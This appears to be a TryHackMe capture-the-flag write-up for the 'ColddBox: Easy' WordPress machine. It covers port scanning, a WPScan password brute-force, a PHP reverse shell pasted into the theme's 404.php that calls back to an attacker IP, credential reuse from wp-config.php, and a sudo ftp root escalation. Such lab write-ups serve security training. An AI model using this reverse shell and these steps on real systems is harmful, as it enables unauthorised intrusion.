# [ColddBox: Easy](https://tryhackme.com/room/colddboxeasy)

## An easy level machine with multiple ways to escalate privileges. By Hixec.

# boot2Root

### user.txt

1. Start with a full port scan using Nmap to discover all open services on the target machine.

```bash
nmap -sV -p- <TARGET_IP>
```

**Results:**

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Run a directory brute-force scan with Gobuster to enumerate hidden paths and files on the web server.

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php -t 50
```

**Results:**

```
/wp-content           (Status: 301) [Size: 321] [--> http://<TARGET_IP>/wp-content/]
/wp-login.php         (Status: 200) [Size: 2547]
/index.php            (Status: 301) [Size: 0] [--> http://<TARGET_IP>/]
/license.txt          (Status: 200) [Size: 19930]
/wp-includes          (Status: 301) [Size: 322] [--> http://<TARGET_IP>/wp-includes/]
/wp-trackback.php     (Status: 200) [Size: 135]
/wp-admin             (Status: 301) [Size: 319] [--> http://<TARGET_IP>/wp-admin/]
/hidden               (Status: 301) [Size: 317] [--> http://<TARGET_IP>/hidden/]
/xmlrpc.php           (Status: 200) [Size: 42]
/wp-signup.php        (Status: 302) [Size: 0] [--> /wp-login.php?action=register]
/server-status        (Status: 403) [Size: 279]
```

3. Navigate to `http://<TARGET_IP>/hidden/`. The page contains a message that leaks potential usernames.

```html
<!DOCTYPE html>
<html>
  <head>
    <meta http-equiv=â€Content-Typeâ€ content=â€text/html; charset=UTF-8â€³ />
    <title>Hidden Place</title>
  </head>
  <body>
    <div align="center">
      <h1>U-R-G-E-N-T</h1>
      <h2>C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. Philip</h2>
    </div>
  </body>
</html>
```

4. Use WPScan to perform a brute-force attack against the WordPress login page. We target the `c0ldd` user we discovered, using the popular `rockyou.txt` wordlist.

```bash
wpscan --url <TARGET_IP> -U c0ldd -P /usr/share/wordlists/rockyou.txt
```

5. Log in to the WordPress admin panel at `http://<TARGET_IP>/wp-login.php` using the credentials discovered by WPScan. Once logged in, you will have full admin access to the WordPress dashboard.

6. To get a reverse shell, navigate to the WordPress Theme Editor at `http://<TARGET_IP>/wp-admin/theme-editor.php?file=404.php&theme=twentyfifteen`. Replace the content of `404.php` with the following PHP reverse shell:

```php
<?php
$ip = '<ATTACKER_IP>';
$port = 4444;

$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
```

Click **Update File** to save the changes to the server.

7. Before triggering the shell, set up a Netcat listener on your attacking machine on the same port specified in the reverse shell.

```bash
nc -lvnp 4444
```

8. Trigger the reverse shell by visiting a non-existent page like `http://<TARGET_IP>/?p=2`, which will cause WordPress to load the modified `404.php` template.

9. Now look inside the WordPress configuration file, which often contains database credentials that are reused elsewhere on the system.

```bash
cat /var/www/html/wp-config.php
```

Look for the `DB_PASSWORD` field inside the file. You will find the password `cybersecurity` assigned to the database user `c0ldd`.

10. Since password reuse is common, attempt to switch to the `c0ldd` system user using the database password found in `wp-config.php`.

```bash
su c0ldd
# Password: cybersecurity
```

11. Read the user flag from `c0ldd`'s home directory.

```bash
cat /home/c0ldd/user.txt
```

<img width="482" height="136" alt="SCREEN01" src="https://github.com/user-attachments/assets/6b880023-6c2f-4106-bc89-37bb6288e4fc" />

---

### root.txt

1. Check what commands the `c0ldd` user is allowed to run with elevated privileges.

```bash
sudo -l
```

**Results:**

```
El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
```

2. Exploit the `ftp` sudo permission to escalate to root. According to [GTFOBins](https://gtfobins.github.io/gtfobins/ftp/#sudo), launching `ftp` with sudo and then spawning a shell from within it will give a root shell, since the shell inherits the elevated privileges.

```bash
sudo /usr/bin/ftp
!/bin/sh
```

3. Read the root flag:

```bash
cat /root/root.txt
```

<img width="441" height="148" alt="SCREEN02" src="https://github.com/user-attachments/assets/54ac2c07-be55-4441-b6dd-68d6772d7b3a" />
